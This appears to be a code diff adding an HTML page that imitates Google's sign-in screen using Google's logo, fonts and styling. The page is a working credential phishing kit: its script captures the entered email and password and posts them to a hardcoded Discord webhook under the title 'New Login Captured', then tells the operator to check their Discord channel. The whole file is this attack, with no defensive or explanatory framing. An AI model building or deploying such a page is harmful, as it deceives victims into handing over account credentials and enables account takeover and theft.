@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Sign-in</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; margin:0; padding:0; }
+    body {
+      background: #fff;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: #fff;
+      padding: 40px 40px 30px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 1px 3px rgba(0,0,0,.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img { height: 30px; }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    p.subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 100%;
+      padding: 13px 15px;
+      margin-bottom: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px #1a73e8;
+      outline: none;
+    }
+    button {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 500;
+      width: 100%;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    button:hover { background: #1669c1; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+  </div>
+  <h1>Sign in</h1>
+  <p class="subtitle">Use your Google Account</p>
+
+  <form id="loginForm">
+    <input type="email" placeholder="Email or phone" required autocomplete="username">
+    <input type="password" placeholder="Password" required autocomplete="current-password">
+    <button type="submit">Next</button>
+  </form>
+</div>
+
+<script>
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1270621315685941262/xQTAvn9oR83ZCnldXIbCZhfJWLWgz8YV5bcIYdwohjjURcBWVH6R11MrbeN6M3cVfu9B';
+
+  document.getElementById('loginForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const email = e.target[0].value.trim();
+    const password = e.target[1].value;
+
+    const embed = {
+      title: "New Login Captured",
+      color: 5814783,
+      fields: [
+        { name: "Email/Phone", value: email || "—", inline: false },
+        { name: "Password", value: password || "—", inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+      alert('Success! Check your Discord channel.');
+    } catch (err) {
+      alert('Failed to send.');
+    }
+  });
+</script>
+
+</body>
+</html>
